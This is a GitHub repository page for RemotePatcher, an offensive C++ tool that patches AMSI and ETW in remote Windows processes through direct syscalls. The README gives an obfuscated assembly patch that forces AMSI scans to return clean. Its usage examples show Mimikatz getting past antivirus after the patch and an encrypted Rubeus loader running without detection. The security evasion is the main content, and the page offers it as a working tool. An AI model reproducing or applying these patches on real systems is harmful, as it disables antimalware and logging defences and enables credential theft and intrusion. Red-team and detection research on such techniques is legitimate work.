# https://github.com/Hagrid29/RemotePatcher

[Skip to content](https://github.com/Hagrid29/RemotePatcher#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/Hagrid29/RemotePatcher) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/Hagrid29/RemotePatcher) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/Hagrid29/RemotePatcher) to refresh your session.Dismiss alert

{{ message }}

[Hagrid29](https://github.com/Hagrid29)/ **[RemotePatcher](https://github.com/Hagrid29/RemotePatcher)** Public

- [Notifications](https://github.com/login?return_to=%2FHagrid29%2FRemotePatcher) You must be signed in to change notification settings
- [Fork\\
10](https://github.com/login?return_to=%2FHagrid29%2FRemotePatcher)
- [Star\\
86](https://github.com/login?return_to=%2FHagrid29%2FRemotePatcher)


main

[**1** Branch](https://github.com/Hagrid29/RemotePatcher/branches) [**0** Tags](https://github.com/Hagrid29/RemotePatcher/tags)

[Go to Branches page](https://github.com/Hagrid29/RemotePatcher/branches)[Go to Tags page](https://github.com/Hagrid29/RemotePatcher/tags)

Go to file

Code

Open more actions menu

## Latest commit

[![Hagrid29](https://avatars.githubusercontent.com/u/97426612?v=4&size=40)](https://github.com/Hagrid29)[Hagrid29](https://github.com/Hagrid29/RemotePatcher/commits?author=Hagrid29)

[minor update](https://github.com/Hagrid29/RemotePatcher/commit/29f478c758714e48c88d3e3ce5a2177c3076b924)

4 years agoApr 28, 2022

[29f478c](https://github.com/Hagrid29/RemotePatcher/commit/29f478c758714e48c88d3e3ce5a2177c3076b924) · 4 years agoApr 28, 2022

## History

[3 Commits](https://github.com/Hagrid29/RemotePatcher/commits/main/)

Open commit details

[View commit history for this file.](https://github.com/Hagrid29/RemotePatcher/commits/main/) 3 Commits

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| [RemotePatcher](https://github.com/Hagrid29/RemotePatcher/tree/main/RemotePatcher "RemotePatcher") | [RemotePatcher](https://github.com/Hagrid29/RemotePatcher/tree/main/RemotePatcher "RemotePatcher") | [minor update](https://github.com/Hagrid29/RemotePatcher/commit/29f478c758714e48c88d3e3ce5a2177c3076b924 "minor update") | 4 years agoApr 28, 2022 |
| [README.md](https://github.com/Hagrid29/RemotePatcher/blob/main/README.md "README.md") | [README.md](https://github.com/Hagrid29/RemotePatcher/blob/main/README.md "README.md") | [direct syscall](https://github.com/Hagrid29/RemotePatcher/commit/f9cc9973630736689ab2db41d69f08ed1a443c69 "direct syscall") | 4 years agoApr 28, 2022 |
| [RemotePatcher.sln](https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher.sln "RemotePatcher.sln") | [RemotePatcher.sln](https://github.com/Hagrid29/RemotePatcher/blob/main/RemotePatcher.sln "RemotePatcher.sln") | [init](https://github.com/Hagrid29/RemotePatcher/commit/f200db268e38c766f377ed871a27a52e226dcf91 "init") | 4 years agoFeb 18, 2022 |
| View all files |

## Repository files navigation

# RemotePatcher

[Permalink: RemotePatcher](https://github.com/Hagrid29/RemotePatcher#remotepatcher)

RemotePatcher is a tinny C++ program that patch AMSI/ETW for remote process via direct syscall. I wrote this to practice C++ programming skill and implement something with [SysWhispers3](https://github.com/klezVirus/SysWhispers3).

## A Little Twist

[Permalink: A Little Twist](https://github.com/Hagrid29/RemotePatcher#a-little-twist)

@RastaMouse's assembly code that commonly used

```
mov eax, 0x80070057
ret
```

Make a bit calculation but still do the same which return AMSI\_RESULT\_CLEAN

```
xor    eax,eax
add    eax,0x7dfdfe4e
add    eax,0x02090209
ret
```

Convert aessmbly code to hex byte array [here](https://defuse.ca/online-x86-assembler.htm#disassembly)

## Usage

[Permalink: Usage](https://github.com/Hagrid29/RemotePatcher#usage)

```
cmd> .\RemotePatcher.exe -h
RemotePatcher
More info: https://github.com/Hagrid29/RemotePatcher/
Options:
  --exe "[cmd]" the program that will be executed and patched
  --pid [pid]   the process ID that will be patched
  -na           to NOT patch AMSI
  -ne           to NOT patch ETW
  -ao           to patch AmsiOpenSession instead of AmsiScanBuffer
  -l            to load amsi.dll
```

**Patch exiting process**

```
PS> "Invoke-Mimikatz"
At line:1 char:1
+ "Invoke-Mimikatz"
+ ~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS> $pid
9756
PS> .\RemotePatcher.exe --pid 9756 -l
[+] Patched etw!
[+] Patched amsi!
PS> "Invoke-Mimikatz"
Invoke-Mimikatz
```

**Start a new program**

CSLoader.exe is a C# binary of [NetLoader](https://github.com/Flangvik/NetLoader) with AMSI/ETW patch functions removed.

```
.\RemotePatcher.exe --exe ".\CSLoader.exe --path rubeus.txt --key mykey --args hash /password:aaa"
[+] Patched etw!
[+] Patched amsi!
[+] Decrypting using key 'mykey'
[+] PATH : ru.txt
[+] Arguments : hash /password:aaa
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Calculate Password Hash(es)

[*] Input password             : aaa
[*]       rc4_hmac             : E24106942BF38BCF57A6A4B29016EFF6

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```

## References

[Permalink: References](https://github.com/Hagrid29/RemotePatcher#references)

- [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)
- [https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/](https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/)
- [https://github.com/klezVirus/SysWhispers3](https://github.com/klezVirus/SysWhispers3)

## About

Patch AMSI and ETW in remote process via direct syscall

### Topics

[amsi](https://github.com/topics/amsi) [etw](https://github.com/topics/etw) [patch](https://github.com/topics/patch) [syscall](https://github.com/topics/syscall)

### Resources

[Readme](https://github.com/Hagrid29/RemotePatcher#readme-ov-file)

[Activity](https://github.com/Hagrid29/RemotePatcher/activity)

### Stars

**86** stars

### Watchers

**2** watching

### Forks

[**10** forks](https://github.com/Hagrid29/RemotePatcher/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FHagrid29%2FRemotePatcher&report=Hagrid29+%28user%29)

## Releases

## Packages

## Used by

## Contributors

## Languages

You can’t perform that action at this time.